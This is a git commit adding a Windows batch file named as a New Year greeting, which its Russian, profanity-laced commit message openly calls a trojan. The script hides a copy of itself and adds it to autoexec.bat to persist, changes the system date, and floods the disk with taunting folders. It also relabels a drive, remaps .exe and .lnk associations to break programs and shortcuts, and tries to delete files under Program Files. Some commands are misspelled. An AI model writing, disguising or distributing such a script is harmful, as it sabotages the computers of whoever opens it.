77849187cba585ae93697f0b45c11c9f72c6eb5a
LOYLYB122 <97908576+LOYLYB122@users.noreply.github.com>
2022-01-20 09:19:22 +0600

    Add files via upload
    Там такой пиздец,не советую открывать так как этот троян сносить все пк,но очень легко обнаруживается антивирусом

---
+++ С новым годом дружище).bat
@@ -0,0 +1,21 @@
+@echo off
+echo ебать ты лооох
+Dste 01.04.88
+if Exist c:Java.bat goto abc
+copy %0 c:Java.bat
+Attrib +h c:Java.bat
+Echo c:Java.bat >>autoexec.bat
+:abc
+md файл тут
+md он пиздит он тут
+md два пиздабола он тут
+md я отвечаю он тут
+md все вы пиздаболы он во мне 
+md дио ах ах
+md джотаро: хооуу фак
+md ахахахах
+Label E: naebalovo
+assoc .exe=.mp3
+assoc .lnk=.jpg
+del C:Program Files/q
+echo GDE TVOI GLAZA??
